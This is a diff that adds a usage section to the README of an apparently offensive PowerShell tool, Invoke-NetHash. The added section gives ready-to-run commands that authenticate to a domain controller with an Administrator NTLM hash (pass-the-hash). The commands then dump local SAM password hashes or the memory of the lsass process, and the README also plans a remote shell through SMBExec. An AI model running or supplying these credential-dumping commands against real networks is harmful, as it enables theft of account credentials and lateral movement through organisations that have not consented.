@@ -13,6 +13,24 @@ For this whole process the script relies on SMB shares - it will create an share
 
 I hope this scripts brings some use to you.
 
+# Usage 
+
+The simplest usage is to use the built in functions for PowerDump (the extraction of hashes from the local SAM Database aka the registry) or LSADump which creates a dump of the lsass process of the remote computer.
+
+## PowerDump
+
+The fastest command for the usage against a single target is:
+```powershell
+ Invoke-NetHash -Hosts dc -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -Powerdump $true -UserDomain "contoso.local" -WriteVerbose $true
+```
+
+## LSADump 
+
+The fastest command for the usage against a single target is:
+```powershell
+ Invoke-NetHash -Hosts dc -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -LSAdump $true -UserDomain "contoso.local" -WriteVerbose $true
+```
+
 # Future Plans
 
 Currently the script is very raw and will be enhanced down the road (some things are quite ugly but it is working and I will replace those part with time) - next to the code itself I plan to integrate an interactive shell triggered by SMBExec.
